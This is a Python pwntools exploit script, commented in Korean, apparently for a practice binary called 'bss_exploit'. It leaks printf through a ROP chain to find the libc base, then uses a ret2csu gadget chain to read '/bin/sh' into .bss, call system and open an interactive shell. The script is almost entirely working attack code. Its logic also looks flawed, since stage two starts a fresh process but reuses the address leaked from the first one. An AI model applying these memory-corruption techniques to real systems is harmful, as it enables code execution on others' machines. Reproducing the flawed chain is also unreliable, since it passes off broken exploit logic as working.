from pwn import *

elf = ELF('./bss_exploit')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')

# 단계 1: leak printf
p = process('./bss_exploit')

# 가젯들
pop_rdi = 0x4012d3
ret = 0x40101a
csu_pop = 0x4012ca
csu_call = 0x4012b0

# 주소들
bss = 0x404080
read_got = elf.got['read']
read_plt = elf.plt['read']
printf_got = elf.got['printf']
printf_plt = elf.plt['printf']
main = 0x40122d

# payload1: printf@got leak
payload1 = b"A"*64 + b"B"*8
payload1 += p64(ret)
payload1 += p64(pop_rdi)
payload1 += p64(printf_got)
payload1 += p64(printf_plt)
payload1 += p64(main)

with open("payload1", "wb") as f:
    f.write(payload1)

p.sendlineafter("Input: ", payload1)

leaked_data = p.recvuntil(b"\x7f")  # 마지막 바이트까지 정확히 받아야 주소 완성됨
leaked_printf = u64(leaked_data[-6:].ljust(8, b'\x00'))
printf_offset = libc.symbols['printf']
system_offset = libc.symbols['system']
libc_base = leaked_printf - printf_offset
system_addr = libc_base + system_offset

log.success(f"leaked printf: {hex(leaked_printf)}")
log.success(f"libc base: {hex(libc_base)}")
log.success(f"system: {hex(system_addr)}")

# 단계 2: read로 /bin/sh 삽입 후 system 호출
p = process('./bss_exploit')

payload2 = b"A"*64 + b"B"*8

payload2 += p64(pop_rdi)
payload2 += p64(0)  # dummy
payload2 += p64(ret)
payload2 += p64(read_plt)   # read 함수의 plt 주소
# payload2 += p64(2)

# CSU 가젯을 통해 read(0, bss, 8)
payload2 += p64(csu_pop)
payload2 += p64(0)         # rbx
payload2 += p64(1)         # rbp
payload2 += p64(0)         # r12 = rdi (fd)
payload2 += p64(bss)       # r13 = rsi (buf)
payload2 += p64(8)         # r14 = rdx (size)
payload2 += p64(read_got)  # r15 = read@got
payload2 += p64(csu_call)

payload2 += p64(0) * 6
# payload2 += p64(read_plt)

# 이후 system(bss)
payload2 += p64(ret)
payload2 += p64(pop_rdi)
payload2 += p64(bss)
payload2 += p64(system_addr)
payload2 += b"\n"

with open("payload2", "wb") as f:
    f.write(payload2)
    print("patload2 저장완료")

p.send(payload2)
sleep(0.1)         # 또는 flush()
p.send(b"/bin/sh\x00")
pause()
p.interactive()
